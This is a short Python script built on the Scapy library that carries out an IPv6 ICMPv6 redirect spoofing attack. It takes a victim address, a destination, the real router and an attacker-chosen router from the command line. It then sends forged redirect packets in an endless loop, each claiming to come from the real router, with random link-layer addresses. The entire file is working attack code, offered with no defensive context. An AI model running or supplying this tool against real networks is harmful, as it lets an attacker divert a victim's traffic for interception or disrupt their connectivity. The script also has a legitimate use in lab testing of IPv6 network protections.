#!/usr/bin/python
import random
import sys
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6ND_Redirect, ICMPv6NDOptDstLLAddr, \
    ICMPv6NDOptRedirectedHdr
from scapy.sendrecv import srflood, send

# Ask user to insert value
if len(sys.argv) == 5:
    victim_ip = sys.argv[1]
    dst_ip = sys.argv[2]
    original_router = sys.argv[3]
    new_router = sys.argv[4]
else:
    print("Please insert:\n 1. Victim IPv6\n 2. Destination IPv6\n "
          "3. Original router\n 4. New router")
    sys.exit(1)

# Generate packet
data = 16 * "A"
base_1 = IPv6()
base_1.src = dst_ip
base_1.dst = victim_ip
packet1 = base_1 / ICMPv6EchoRequest(data=data)

base_2 = IPv6()
base_2.src = original_router
base_2.dst = victim_ip

while True:
    random_mac = "01:02:03:%02x:%02x:%02x" % (random.randint(0, 255),
                                              random.randint(0, 255),
                                              random.randint(0, 255))
    packet2 = base_2 / ICMPv6ND_Redirect(tgt=new_router,
                                         dst=dst_ip) / \
              ICMPv6NDOptDstLLAddr(lladdr=random_mac) / \
              ICMPv6NDOptRedirectedHdr(pkt=packet1)
    send(packet2, verbose=False)

